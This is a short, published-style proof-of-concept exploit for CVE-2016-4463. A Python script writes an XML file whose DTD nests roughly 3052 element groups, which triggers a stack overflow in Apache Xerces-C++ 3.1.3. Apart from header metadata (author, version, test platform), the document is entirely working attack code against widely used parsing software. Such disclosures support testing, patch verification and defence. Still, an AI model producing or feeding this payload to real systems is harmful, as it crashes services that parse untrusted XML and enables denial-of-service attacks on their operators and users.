# Exploit Title: Stack-based Buffer Overflow in Apache Xerces-C++ before 3.1.4
# Date: 07.10.2018
# Exploit Author: Luke Arntson arntsonl@gmail.com
# Vendor Homepage: https://www.apache.org/
# Software Link: https://xerces.apache.org/xerces-c/
# Version: 3.1.3
# Tested on: Ubuntu 
# CVE : CVE-2016-4463

# Stack size could vary depending on how Xerces is generated
# 3076 == stack overflow on new(), ~3050 == stack overflow on delete()
exsize=3052
f = open("exploit_cve20164463.xml", "wb")
f.write('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE dtd [<!ELEMENT a0 ')
for i in range(exsize):
	f.write('(a|')
for i in range(exsize):
	f.write(')')
f.write('>]>')
